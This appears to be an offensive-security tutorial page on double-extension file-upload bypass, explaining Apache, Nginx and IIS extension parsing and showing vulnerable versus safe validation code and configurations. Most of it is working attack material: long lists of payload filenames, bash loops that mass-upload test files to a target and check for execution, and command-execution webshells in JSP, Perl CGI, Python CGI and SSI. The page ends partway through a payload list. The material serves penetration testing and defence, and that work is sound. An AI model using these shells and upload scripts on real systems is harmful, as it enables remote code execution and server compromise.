---
title: Double Extension Bypass
description: Exploiting double extension bypass techniques in file upload vulnerabilities to achieve remote code execution, XSS, and server compromise.
navigation:
  icon: i-lucide-copy
  title: Double Extension Bypass
---

## What is Double Extension Bypass

::badge
**Critical Severity — CWE-434**
::

Double extension bypass is an attack technique where an attacker crafts a filename containing two or more file extensions to trick the server into misinterpreting the file type. The core exploitation relies on a fundamental disagreement — the **application validates one extension** while the **web server executes based on another**.

When a file named `shell.php.jpg` is uploaded, the application may check only the last extension `.jpg` and accept it as an image file. However, depending on the server configuration, the web server may process the file using the `.php` extension and execute it as server-side code.

::note
Double extension bypass is one of the most commonly successful techniques in bug bounty programs because developers frequently implement naive extension checks that only inspect the final extension in the filename string.
::

This vulnerability exists because of a mismatch in how different software components parse filenames.

- **Application logic** often splits the filename by `.` and checks only the **last** segment
- **Apache with misconfigured handlers** may parse the **first known** extension from right to left
- **Nginx with misconfigured `location` blocks** may match based on the **last** extension but pass execution to the wrong handler
- **IIS** may have handler mappings that process based on **any** matching extension in the path

::tip
The success of double extension bypass depends entirely on how the backend server is configured to handle file extensions. Always fingerprint the server technology before testing.
::

---

## How Double Extension Parsing Works

Understanding why double extensions work requires knowing how different servers parse filenames internally.

::accordion
  :::accordion-item{icon="i-lucide-server" label="Apache HTTPD Parsing Behavior"}
  Apache uses a concept called **handler mapping**. When `AddHandler` or `AddType` directives are configured, Apache scans the filename from right to left looking for a **known extension**. If the rightmost extension is unknown to Apache, it moves to the next one.

  ```bash
  # Example filename: shell.php.xyz123
  
  # Apache's parsing logic (right to left):
  # 1. Check .xyz123 → Unknown extension, skip
  # 2. Check .php → Known! Maps to application/x-httpd-php
  # 3. Result: File is processed as PHP
  
  # This happens when Apache has:
  # AddHandler application/x-httpd-php .php
  # or
  # AddType application/x-httpd-php .php
  
  # The key insight: Apache doesn't stop at the LAST extension
  # It finds the FIRST KNOWN extension scanning right-to-left
  
  # Another example: shell.php.jpg
  # 1. Check .jpg → Known! Maps to image/jpeg
  # 2. But if AddHandler php-script .php is set
  #    Apache recognizes BOTH .jpg AND .php
  #    The handler takes precedence → Executes as PHP
  
  # This is why shell.php.xxxrandom works better than shell.php.jpg
  # .jpg is known to Apache, .xxxrandom is not
  ```

  When Apache encounters a file with multiple extensions and the `mod_mime` module is loaded, it can assign **multiple metadata** from different extensions. A file named `shell.php.gif` can simultaneously be recognized as `image/gif` (from `.gif`) and handled by the PHP processor (from `.php`). The handler directive wins over the MIME type assignment, causing PHP execution even though the content type says image.

  ```bash
  # Apache configuration that makes this vulnerable:
  
  # Vulnerable: AddHandler makes ANY file with .php anywhere in name executable
  AddHandler application/x-httpd-php .php
  
  # Vulnerable: Same with AddType
  AddType application/x-httpd-php .php
  
  # Safe: FilesMatch with end-of-string anchor
  <FilesMatch "\.php$">
    SetHandler application/x-httpd-php
  </FilesMatch>
  
  # The $ anchor ensures ONLY files ENDING in .php are processed
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Nginx Parsing Behavior"}
  Nginx does not execute files on its own. It relies on **FastCGI** (typically PHP-FPM) or **proxy_pass** to process dynamic content. Double extension bypass in Nginx exploits misconfigured `location` blocks.

  ```bash
  # Vulnerable Nginx configuration:
  location ~ \.php {
      fastcgi_pass 127.0.0.1:9000;
      include fastcgi_params;
      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  }
  # This matches ANY URL containing .php ANYWHERE
  # So /uploads/shell.php.jpg still matches because .php is in the path
  
  # Combined with cgi.fix_pathinfo=1 in php.ini:
  # Nginx passes /uploads/shell.jpg/nonexistent.php to PHP-FPM
  # PHP-FPM strips /nonexistent.php, executes /uploads/shell.jpg as PHP
  # This is the classic Nginx + PHP path info vulnerability
  
  # Safe Nginx configuration:
  location ~ \.php$ {
      # The $ ensures only URLs ENDING in .php are processed
      fastcgi_pass 127.0.0.1:9000;
      include fastcgi_params;
      fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
  }
  ```

  The critical difference is the `$` anchor at the end of the regex pattern. Without it, any filename containing `.php` anywhere triggers PHP processing.
  :::

  :::accordion-item{icon="i-lucide-server" label="IIS Parsing Behavior"}
  Microsoft IIS uses handler mappings defined in `applicationHost.config` or `web.config`. IIS has historically had several parsing quirks that enable double extension attacks.

  ```bash
  # IIS semicolon parsing (IIS 6.0 and some later versions):
  # shell.asp;.jpg → IIS sees shell.asp (truncates at semicolon)
  # This is technically a different bug but often combined with double extensions
  
  # IIS handler mapping behavior:
  # If *.asp is mapped to asp.dll handler
  # A file named shell.asp.jpg may still match depending on handler config
  
  # IIS with URL rewrite module:
  # Rewrite rules may strip or ignore the second extension
  # shell.aspx.jpg → internal rewrite to shell.aspx
  
  # IIS path parsing with double extensions:
  # /uploads/shell.asp/shell.jpg → May execute shell.asp
  # The /shell.jpg is treated as PATH_INFO
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Application-Level Parsing Flaws"}
  Most double extension bypasses succeed because of flawed application code, not just server configuration.

  ```python
  # VULNERABLE: Only checks last extension
  filename = "shell.php.jpg"
  ext = filename.split(".")[-1]  # Returns "jpg" → Passes validation
  
  # VULNERABLE: Uses os.path.splitext (splits on LAST dot only)
  import os
  name, ext = os.path.splitext("shell.php.jpg")
  # name = "shell.php", ext = ".jpg" → Passes validation
  
  # VULNERABLE: Regex without anchoring
  import re
  if re.search(r'\.(jpg|png|gif)', filename):
      allow_upload()  # Matches .jpg in shell.php.jpg
  
  # VULNERABLE: Checks extension but saves original filename
  if filename.endswith(('.jpg', '.png', '.gif')):
      save_file(filename)  # Saves as shell.php.jpg
      # Server then executes .php based on its own parsing
  
  # SAFE: Strips all but last extension and renames
  import uuid
  ext = os.path.splitext(filename)[1]
  if ext.lower() in ['.jpg', '.png', '.gif']:
      safe_name = f"{uuid.uuid4()}{ext}"  # e.g., abc123.jpg
      save_file(safe_name)
  ```

  ```javascript
  // VULNERABLE Node.js: path.extname checks last extension only
  const path = require('path');
  let ext = path.extname('shell.php.jpg'); // Returns '.jpg'
  
  // VULNERABLE: Regex without end anchor
  if (/\.(jpg|png|gif)/.test(filename)) {
    // Passes for 'shell.php.jpg'
  }
  
  // SAFE: Whitelist + rename
  const safeExt = path.extname(filename).toLowerCase();
  if (['.jpg', '.png', '.gif'].includes(safeExt)) {
    const safeName = `${crypto.randomUUID()}${safeExt}`;
    // Save with random name
  }
  ```

  ```php
  // VULNERABLE PHP: pathinfo gets last extension
  $ext = pathinfo("shell.php.jpg", PATHINFO_EXTENSION);
  // Returns "jpg" → Passes blacklist
  
  // VULNERABLE: explode and check last
  $parts = explode(".", $filename);
  $ext = end($parts); // "jpg"
  
  // VULNERABLE: Blacklist that only checks last extension
  $blocked = ['php', 'asp', 'jsp'];
  $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
  if (!in_array($ext, $blocked)) {
      move_uploaded_file($tmp, "uploads/" . $filename);
      // Saves as shell.php.jpg → Apache executes .php
  }
  ```
  :::
::

---

## Server Fingerprinting for Double Extension

::warning
Double extension bypass success depends entirely on the target server technology. Always fingerprint before testing to avoid wasting time on irrelevant payloads.
::

::tabs
  :::tabs-item{icon="i-lucide-search" label="Fingerprint Commands"}
  ```bash
  # === HTTP Header Analysis ===
  curl -sI https://target.com | grep -iE "^server:|^x-powered|^x-aspnet|^x-generator|^x-drupal"
  
  # Verbose header dump
  curl -sI https://target.com | head -30
  
  # Multiple paths for deeper fingerprinting
  for path in / /index.php /index.asp /index.jsp /robots.txt /favicon.ico; do
    echo "--- $path ---"
    curl -sI "https://target.com$path" 2>/dev/null | grep -iE "^server:|^x-powered"
  done
  
  # === Technology Detection Tools ===
  whatweb https://target.com -v --color=never
  
  wappalyzer https://target.com 2>/dev/null
  
  webanalyze -host https://target.com -crawl 2
  
  # === Nuclei Technology Detection ===
  nuclei -u https://target.com -tags tech -silent
  nuclei -u https://target.com -t http/technologies/ -silent
  
  # === Extension Probing (determine what extensions the server processes) ===
  # Create a test file with unique marker
  echo "EXTENSION_PROBE_TEST" > /tmp/probe.txt
  
  # Test which extensions return 200 vs 403 vs 404
  for ext in php php3 php5 phtml phar asp aspx jsp jspx cfm pl py rb; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/nonexistent.$ext" 2>/dev/null)
    echo ".$ext → HTTP $STATUS"
  done
  # Different error codes for .php vs .txt reveal the server processes PHP
  # 404 on .php but 404 on .fakext → Both not found (no special handling)
  # 404 on .php but different page → PHP is processed differently
  
  # === Check for mod_mime / AddHandler presence ===
  # Upload a file with a totally fake extension and .php
  # If shell.php.fakext123 executes as PHP → mod_mime with AddHandler is active
  
  # === Check Nginx path info vulnerability ===
  # Access a known image and append /test.php
  curl -sI "https://target.com/images/logo.png/test.php"
  # If this returns 200 with PHP headers → Nginx path info is vulnerable
  
  # === Check Apache mod_negotiation (MultiViews) ===
  # If enabled, requesting "shell" may match "shell.php"
  curl -sI "https://target.com/uploads/shell" -H "Accept: */*"
  # If it resolves to shell.php → MultiViews is enabled
  ```
  :::

  :::tabs-item{icon="i-lucide-list" label="Technology → Extension Matrix"}
  The effectiveness of each double extension combination varies by server technology. Use this matrix to select the right payloads.

  ```bash
  # === Apache + mod_php / mod_mime ===
  # Most effective double extension payloads:
  shell.php.jpg          # Classic — works if AddHandler is set
  shell.php.xxxrandom    # Better — unknown ext forces fallback to .php
  shell.php.abc          # Unknown extension fallback
  shell.php.123          # Numeric unknown extension
  shell.php.blah         # Any gibberish extension
  shell.php7.jpg         # php7 handler mapping
  shell.phtml.jpg        # phtml handler mapping
  shell.phar.gif         # phar handler mapping
  
  # === Apache + PHP-FPM (via ProxyPassMatch) ===
  # Usually NOT vulnerable to double extension
  # Unless ProxyPassMatch regex is weak:
  # ProxyPassMatch ^/(.*\.php) fcgi://127.0.0.1:9000/var/www/$1
  # This matches shell.php.jpg because .*\.php matches shell.php
  shell.php.jpg          # May work with weak ProxyPassMatch regex
  
  # === Nginx + PHP-FPM ===
  # Double extension in filename alone usually doesn't work
  # But path-based double extension does:
  shell.jpg/anything.php  # Path info exploitation
  shell.gif/.php          # Null path info
  # Standard double extension (works only with misconfigured location block):
  shell.php.jpg          # Only if location ~ \.php (without $)
  
  # === IIS + ASP/ASPX ===
  shell.asp.jpg          # Handler mapping dependent
  shell.aspx.jpg         # Less likely to work on modern IIS
  shell.asp;.jpg         # Semicolon truncation (IIS 6.0+)
  shell.aspx;.jpg        # Semicolon variant
  shell.cer.jpg          # .cer mapped to ASP on some IIS configs
  shell.asa.jpg          # .asa mapped to ASP
  
  # === Tomcat + JSP ===
  shell.jsp.jpg          # Handler mapping dependent
  shell.jspx.jpg         # JSPX variant
  shell.jsp.xxxrandom    # Unknown extension fallback
  
  # === Python (Django/Flask behind Apache/Nginx) ===
  # Double extension rarely works — Python frameworks handle routing internally
  # But if static file serving is misconfigured:
  shell.py.jpg           # Very unlikely to execute
  
  # === Node.js (Express behind Nginx) ===
  # Double extension very unlikely to work
  # Node.js doesn't execute files based on extension
  ```
  :::
::

---

## Double Extension Payload Categories

Double extension payloads fall into several categories based on the position and type of extensions used. Each category targets a different parsing weakness.

::card-group
  :::card
  ---
  icon: i-lucide-arrow-right
  title: Forward Double Extension
  ---
  Executable extension comes **first**, safe extension comes **last**. The application checks the last extension and allows the upload. The server recognizes the first executable extension.
  
  `shell.php.jpg` · `shell.asp.png` · `shell.jsp.gif`
  :::

  :::card
  ---
  icon: i-lucide-arrow-left
  title: Reverse Double Extension
  ---
  Safe extension comes **first**, executable extension comes **last**. Targets applications that check the first extension or have loose regex patterns.
  
  `shell.jpg.php` · `shell.png.asp` · `shell.gif.jsp`
  :::

  :::card
  ---
  icon: i-lucide-shuffle
  title: Unknown Extension Fallback
  ---
  Executable extension paired with a **completely unknown/fake** extension. Forces the server to fall back to the known extension for handler selection.
  
  `shell.php.xyz` · `shell.php.abc123` · `shell.php.fakext`
  :::

  :::card
  ---
  icon: i-lucide-layers
  title: Triple/Multi Extension
  ---
  Three or more extensions chained together. Creates confusion in parsers that handle multiple dots differently. Some check first, some check last, some check all.
  
  `shell.php.jpg.png` · `shell.jpg.php.gif` · `shell.php.abc.jpg`
  :::

  :::card
  ---
  icon: i-lucide-type
  title: Mixed Case Double Extension
  ---
  Combine double extensions with case variations. Bypasses case-sensitive blacklists while maintaining server execution.
  
  `shell.pHp.jpg` · `shell.PHP.gif` · `shell.Php.png`
  :::

  :::card
  ---
  icon: i-lucide-hash
  title: Special Character Injection
  ---
  Insert null bytes, spaces, dots, semicolons, or encoding between extensions. Exploits parser differences in string termination and normalization.
  
  `shell.php%00.jpg` · `shell.php .jpg` · `shell.php;.jpg`
  :::
::

---

## Forward Double Extension Attacks

The most common and widely successful double extension technique. The executable extension is placed before the safe extension.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="PHP Double Extensions"}
  ```bash
  # === Core PHP Double Extension Payloads ===
  # These target Apache with AddHandler/AddType for PHP

  # Classic .php.jpg combinations
  shell.php.jpg
  shell.php.jpeg
  shell.php.png
  shell.php.gif
  shell.php.bmp
  shell.php.webp
  shell.php.ico
  shell.php.tiff
  shell.php.svg

  # Alternative PHP handler extensions + image extensions
  shell.php3.jpg
  shell.php4.jpg
  shell.php5.jpg
  shell.php7.jpg
  shell.php8.jpg
  shell.pht.jpg
  shell.phtml.jpg
  shell.phar.jpg
  shell.phps.jpg
  shell.pgif.jpg
  shell.pht7.jpg
  shell.phpt.jpg

  # PHP + document extensions
  shell.php.pdf
  shell.php.doc
  shell.php.txt
  shell.php.csv
  shell.php.xml
  shell.php.json
  shell.php.html

  # PHP + archive extensions
  shell.php.zip
  shell.php.tar
  shell.php.gz
  shell.php.rar

  # === Upload Testing Commands ===
  
  # Single payload test
  echo '<?php echo "DOUBLE_EXT_SUCCESS"; phpinfo(); ?>' > shell.php.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.jpg;type=image/jpeg" \
    -b "session=YOUR_SESSION_COOKIE" -v
  
  # Verify execution
  curl -s "https://target.com/uploads/shell.php.jpg" | grep -c "DOUBLE_EXT_SUCCESS"
  
  # Batch test all PHP double extensions against target
  echo '<?php echo md5("double_ext_test"); ?>' > /tmp/shell_test.php

  PHP_EXTS="php php3 php4 php5 php7 php8 pht phtml phar phps pgif pht7"
  IMG_EXTS="jpg jpeg png gif bmp webp ico tiff svg"

  for php_ext in $PHP_EXTS; do
    for img_ext in $IMG_EXTS; do
      FILENAME="test.$php_ext.$img_ext"
      cp /tmp/shell_test.php "$FILENAME"
      
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@$FILENAME;type=image/$img_ext" \
        -b "session=YOUR_SESSION" 2>/dev/null)
      
      if [ "$STATUS" = "200" ]; then
        echo "[UPLOADED] $FILENAME → HTTP $STATUS"
        # Now check execution
        EXEC_CHECK=$(curl -s "https://target.com/uploads/$FILENAME" 2>/dev/null)
        if echo "$EXEC_CHECK" | grep -q "$(echo -n 'double_ext_test' | md5sum | cut -d' ' -f1)"; then
          echo "[!!!RCE!!!] $FILENAME EXECUTES AS PHP!"
        fi
      else
        echo "[BLOCKED]  $FILENAME → HTTP $STATUS"
      fi
      
      rm -f "$FILENAME"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="ASP/ASPX Double Extensions"}
  ```bash
  # === ASP Classic Double Extensions ===
  shell.asp.jpg
  shell.asp.png
  shell.asp.gif
  shell.asp.bmp
  shell.asp.pdf
  shell.asp.txt
  shell.asp.doc

  # === ASPX Double Extensions ===
  shell.aspx.jpg
  shell.aspx.png
  shell.aspx.gif
  shell.aspx.pdf

  # === Alternative ASP Handler Extensions ===
  shell.cer.jpg         # .cer often mapped to ASP handler on IIS
  shell.asa.jpg         # .asa is ASP application file
  shell.ashx.jpg        # Generic handler
  shell.asmx.jpg        # Web service
  shell.cshtml.jpg      # Razor engine
  shell.vbhtml.jpg      # VB Razor engine
  shell.config.jpg      # Configuration handler

  # === IIS Semicolon + Double Extension (Combined) ===
  shell.asp;.jpg
  shell.asp;test.jpg
  shell.aspx;.jpg
  shell.aspx;test.jpg
  shell.cer;.jpg

  # === Upload Testing ===
  # ASP Classic shell
  echo '<% Response.Write("DOUBLE_EXT_ASP") %>' > shell.asp.jpg
  curl -X POST https://target.com/upload \
    -F "file=@shell.asp.jpg;type=image/jpeg" \
    -b "session=YOUR_SESSION" -v

  # ASPX shell
  cat > shell.aspx.jpg << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <% Response.Write("DOUBLE_EXT_ASPX"); %>
  ASPXEOF
  curl -X POST https://target.com/upload \
    -F "file=@shell.aspx.jpg;type=image/jpeg" \
    -b "session=YOUR_SESSION" -v

  # Batch test ASP extensions
  ASP_EXTS="asp aspx cer asa ashx asmx cshtml vbhtml"
  IMG_EXTS="jpg png gif bmp"

  for asp_ext in $ASP_EXTS; do
    for img_ext in $IMG_EXTS; do
      FILENAME="test.$asp_ext.$img_ext"
      echo '<% Response.Write("EXEC_TEST") %>' > "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@$FILENAME;type=image/$img_ext" -b "session=YOUR_SESSION" 2>/dev/null)
      echo ".$asp_ext.$img_ext → HTTP $STATUS"
      rm -f "$FILENAME"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="JSP Double Extensions"}
  ```bash
  # === JSP Double Extensions ===
  shell.jsp.jpg
  shell.jsp.png
  shell.jsp.gif
  shell.jsp.bmp
  shell.jsp.pdf
  shell.jsp.txt

  # === JSPX and Variants ===
  shell.jspx.jpg
  shell.jsw.jpg
  shell.jsv.jpg
  shell.jspf.jpg

  # === JSP Shell Payload ===
  cat > shell.jsp.jpg << 'JSPEOF'
  <%@ page import="java.util.*,java.io.*" %>
  <%
  out.println("DOUBLE_EXT_JSP");
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) out.println(line);
  }
  %>
  JSPEOF

  # Upload
  curl -X POST https://target.com/upload \
    -F "file=@shell.jsp.jpg;type=image/jpeg" \
    -b "session=YOUR_SESSION" -v

  # Test execution
  curl "https://target.com/uploads/shell.jsp.jpg?cmd=id"

  # Batch test
  JSP_EXTS="jsp jspx jsw jsv jspf"
  for jsp_ext in $JSP_EXTS; do
    for img_ext in jpg png gif; do
      echo "test" > "t.$jsp_ext.$img_ext"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@t.$jsp_ext.$img_ext;type=image/$img_ext" -b "session=YOUR_SESSION" 2>/dev/null)
      echo ".$jsp_ext.$img_ext → HTTP $STATUS"
      rm -f "t.$jsp_ext.$img_ext"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Other Language Double Extensions"}
  ```bash
  # === Perl CGI ===
  shell.pl.jpg
  shell.cgi.jpg
  shell.pm.jpg

  # === Python ===
  shell.py.jpg
  shell.pyw.jpg
  shell.pyc.jpg

  # === Ruby ===
  shell.rb.jpg
  shell.erb.jpg
  shell.rhtml.jpg

  # === ColdFusion ===
  shell.cfm.jpg
  shell.cfml.jpg
  shell.cfc.jpg

  # === Server Side Includes ===
  shell.shtml.jpg
  shell.stm.jpg
  shell.shtm.jpg

  # === XSS/Client-Side Double Extensions ===
  xss.html.jpg
  xss.htm.jpg
  xss.xhtml.jpg
  xss.svg.jpg
  xss.xml.jpg
  xss.xsl.jpg

  # === Perl CGI Shell ===
  cat > shell.cgi.jpg << 'PERLEOF'
  #!/usr/bin/perl
  print "Content-Type: text/html\n\n";
  print "DOUBLE_EXT_PERL\n";
  my $cmd = $ENV{'QUERY_STRING'};
  $cmd =~ s/cmd=//;
  print "<pre>" . `$cmd` . "</pre>";
  PERLEOF

  # === Python CGI Shell ===
  cat > shell.py.jpg << 'PYEOF'
  #!/usr/bin/env python3
  import subprocess, os, cgi
  print("Content-Type: text/html\n")
  print("DOUBLE_EXT_PYTHON")
  params = cgi.FieldStorage()
  cmd = params.getvalue('cmd', 'id')
  print(f"<pre>{subprocess.getoutput(cmd)}</pre>")
  PYEOF

  # === SSI Shell ===
  cat > shell.shtml.jpg << 'SSIEOF'
  <!--#exec cmd="id" -->
  SSIEOF
  ```
  :::
::

---

## Unknown Extension Fallback Attacks

::caution
This is often **more effective** than standard double extensions because unknown extensions are not mapped to any MIME type, forcing Apache to fall back to the known handler extension.
::

When Apache encounters a file with multiple extensions and one of them is completely unknown (not defined in `mime.types` or any `AddType` directive), it **ignores** the unknown extension and processes the file based on the **next known extension**. This makes fake/random extensions more reliable than real image extensions.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Random Extension Payloads"}
  ```bash
  # === Why This Works ===
  # Apache checks right-to-left:
  # shell.php.fakext → .fakext unknown → .php known → Execute as PHP!
  # shell.php.jpg → .jpg known (image/jpeg) → May NOT fall back to .php
  # 
  # The unknown extension trick avoids the conflict where Apache
  # assigns image/jpeg MIME type from .jpg extension

  # === Random/Fake Extension Payloads ===
  shell.php.xyz
  shell.php.abc
  shell.php.xxx
  shell.php.test
  shell.php.fakext
  shell.php.random
  shell.php.notreal
  shell.php.blah
  shell.php.qwerty
  shell.php.foobar
  shell.php.aaa
  shell.php.bbb
  shell.php.zzz
  shell.php.123
  shell.php.456
  shell.php.000
  shell.php.evil
  shell.php.safe
  shell.php.clean
  shell.php.image
  shell.php.photo
  shell.php.data
  shell.php.file

  # === Longer Random Extensions (less likely to be in mime.types) ===
  shell.php.xyz123abc
  shell.php.thisisnotavalidextension
  shell.php.a1b2c3d4e5
  shell.php.fakefakefake
  shell.php.extensionbypass
  shell.php.$(head -c 8 /dev/urandom | xxd -p)  # Random hex extension

  # === Generate and Test Random Extensions ===
  echo '<?php echo md5("fallback_test"); ?>' > /tmp/test_shell.php

  # Generate 50 random extensions and test each
  for i in $(seq 1 50); do
    RANDOM_EXT=$(head -c 4 /dev/urandom | xxd -p)
    FILENAME="test.php.$RANDOM_EXT"
    cp /tmp/test_shell.php "$FILENAME"
    
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@$FILENAME;type=application/octet-stream" \
      -b "session=YOUR_SESSION" 2>/dev/null)
    
    echo "$FILENAME → HTTP $STATUS"
    rm -f "$FILENAME"
  done

  # === Test Execution of Uploaded Files ===
  echo '<?php echo "FALLBACK_RCE_" . php_uname(); ?>' > shell.php.xyz
  curl -X POST https://target.com/upload \
    -F "file=@shell.php.xyz;type=application/octet-stream" \
    -b "session=YOUR_SESSION"

  # Check execution
  curl -s "https://target.com/uploads/shell.php.xyz"
  # If you see "FALLBACK_RCE_Linux..." → RCE achieved!

  # === Compare: Known vs Unknown Extension ===
  # Upload both and compare execution
  echo '<?php echo "TEST"; ?>' > shell.php.jpg    # Known extension
  echo '<?php echo "TEST"; ?>' > shell.php.xyz    # Unknown extension
  
  curl -X POST https://target.com/upload -F "file=@shell.php.jpg" -b "session=COOKIE"
  curl -X POST https://target.com/upload -F "file=@shell.php.xyz" -b "session=COOKIE"
  
  echo "--- Known (.jpg) ---"
  curl -sI "https://target.com/uploads/shell.php.jpg" | grep content-type
  echo "--- Unknown (.xyz) ---"
  curl -sI "https://target.com/uploads/shell.php.xyz" | grep content-type
  # If .xyz returns text/html but .jpg returns image/jpeg
  # → Unknown extension fallback works!
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Smart Extension Discovery"}
  ```bash
  # === Find Extensions NOT in Apache's mime.types ===
  # Download Apache's default mime.types
  curl -s https://raw.githubusercontent.com/apache/httpd/trunk/docs/conf/mime.types \
    | grep -v "^#" | awk '{for(i=2;i<=NF;i++) print $i}' | sort -u > known_extensions.txt

  # Generate candidate extensions not in the list
  python3 << 'PYEOF'
  import string
  import random

  # Load known extensions
  with open('known_extensions.txt') as f:
      known = set(f.read().split())

  # Generate 3-4 character random extensions
  candidates = []
  chars = string.ascii_lowercase + string.digits
  
  for length in [3, 4, 5]:
      for _ in range(100):
          ext = ''.join(random.choices(chars, k=length))
          if ext not in known:
              candidates.append(ext)

  # Print unique unknown extensions
  for ext in sorted(set(candidates))[:50]:
      print(f"shell.php.{ext}")
  PYEOF

  # === Verify Extension is Unknown to Target Server ===
  # Request a nonexistent file with the extension
  # If Content-Type is application/octet-stream or missing → Extension is unknown
  for ext in xyz abc qwz fke zyx bla; do
    CT=$(curl -sI "https://target.com/nonexistent.$ext" 2>/dev/null | grep -i "^content-type:" | tr -d '\r')
    echo ".$ext → $CT"
  done
  ```
  :::
::

---

## Reverse Double Extension Attacks

In reverse double extensions, the safe extension comes first and the executable extension comes last. This targets applications that validate the **first extension** rather than the last.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Reverse Extension Payloads"}
  ```bash
  # === Reverse Double Extension Logic ===
  # Application code: checks first extension after first dot
  # filename.split(".")[1] → returns "jpg" for "shell.jpg.php"
  # But server processes based on last extension (.php)

  # === PHP Reverse Extensions ===
  shell.jpg.php
  shell.png.php
  shell.gif.php
  shell.bmp.php
  shell.webp.php
  shell.ico.php
  shell.pdf.php
  shell.txt.php
  shell.doc.php
  shell.csv.php

  # === With Alternative PHP Extensions ===
  shell.jpg.php3
  shell.jpg.php5
  shell.jpg.php7
  shell.jpg.phtml
  shell.jpg.phar
  shell.jpg.pht
  shell.png.phtml
  shell.gif.phar
  shell.bmp.php5

  # === ASP Reverse Extensions ===
  shell.jpg.asp
  shell.jpg.aspx
  shell.jpg.cer
  shell.jpg.asa
  shell.png.asp
  shell.gif.aspx

  # === JSP Reverse Extensions ===
  shell.jpg.jsp
  shell.jpg.jspx
  shell.png.jsp
  shell.gif.jspx

  # === Upload Testing ===
  echo '<?php echo "REVERSE_DOUBLE_EXT"; ?>' > shell.jpg.php
  curl -X POST https://target.com/upload \
    -F "file=@shell.jpg.php;type=image/jpeg" \
    -b "session=YOUR_SESSION" -v

  # Test execution — server should process .php (last extension)
  curl -s "https://target.com/uploads/shell.jpg.php"

  # === Batch Test Reverse Extensions ===
  echo '<?php echo md5("reverse_test"); ?>' > /tmp/rev_shell.php
  
  SAFE_EXTS="jpg png gif bmp pdf txt doc csv xml"
  EXEC_EXTS="php php3 php5 phtml phar pht"
  
  for safe in $SAFE_EXTS; do
    for exec in $EXEC_EXTS; do
      FILENAME="test.$safe.$exec"
      cp /tmp/rev_shell.php "$FILENAME"
      STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
        -F "file=@$FILENAME;type=image/jpeg" -b "session=YOUR_SESSION" 2>/dev/null)
      echo "$FILENAME → HTTP $STATUS"
      rm -f "$FILENAME"
    done
  done
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Identifying Vulnerable Parsers"}
  ```bash
  # === Detecting First-Extension Validation ===
  # Upload the same shell with forward and reverse double extensions
  # Compare which gets accepted

  echo '<?php echo "TEST"; ?>' > /tmp/test.php

  # Forward: shell.php.jpg (app checks .jpg → allows)
  cp /tmp/test.php forward.php.jpg
  FWD=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@forward.php.jpg;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)

  # Reverse: shell.jpg.php (app checks .jpg first → allows if checking first ext)
  cp /tmp/test.php reverse.jpg.php
  REV=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@reverse.jpg.php;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)

  echo "Forward (shell.php.jpg) → HTTP $FWD"
  echo "Reverse (shell.jpg.php) → HTTP $REV"

  # If forward is BLOCKED but reverse is ALLOWED:
  # → App checks LAST extension and blocks .jpg? No...
  # → App checks for .php ANYWHERE and blocks it
  # → Need to try encoding or alternative extensions

  # If forward is ALLOWED but reverse is BLOCKED:
  # → App checks LAST extension → .jpg passes, .php blocked
  # → Standard forward double extension works!

  # If BOTH are ALLOWED:
  # → Minimal or no extension validation → Easy exploitation

  # If BOTH are BLOCKED:
  # → Need to try encoding, case, or special character bypasses

  rm -f forward.php.jpg reverse.jpg.php

  # === Framework-Specific First-Extension Checks ===
  # Some frameworks split on first dot:
  # Ruby on Rails: file.split('.').second
  # Custom PHP: explode('.', $name)[1]
  # Django: name.split('.')[1] if len(parts) > 1

  # Test with triple extension to detect parsing behavior
  echo '<?php echo "TRIPLE_TEST"; ?>' > test.jpg.txt.php
  curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
    -F "file=@test.jpg.txt.php;type=image/jpeg" -b "session=COOKIE"
  ```
  :::
::

---

## Triple and Multi-Extension Attacks

When both forward and reverse double extensions are blocked, chaining three or more extensions can confuse parsers that have specific logic for handling exactly two extensions.

::code-group
```bash [Triple Extension Payloads]
# === Forward Triple Extensions ===
# Executable first, two safe extensions after
shell.php.jpg.png
shell.php.gif.jpg
shell.php.png.bmp
shell.php.bmp.gif
shell.php.txt.jpg
shell.php.pdf.png
shell.php.jpg.txt
shell.php.abc.jpg       # Unknown + known
shell.php.xyz.png       # Unknown + known

# === Middle Executable Extensions ===
# Safe, then executable, then safe
shell.jpg.php.png
shell.png.php.jpg
shell.gif.php.bmp
shell.txt.php.jpg
shell.pdf.php.gif

# === End Executable Extensions ===
# Two safe, then executable
shell.jpg.png.php
shell.gif.bmp.php
shell.png.txt.php
shell.txt.doc.php

# === Mixed Unknown Extensions ===
shell.php.xyz.abc
shell.php.test.fake
shell.abc.php.xyz
shell.xyz.abc.php

# === Quad Extensions ===
shell.php.jpg.png.gif
shell.jpg.php.png.gif
shell.jpg.png.php.gif
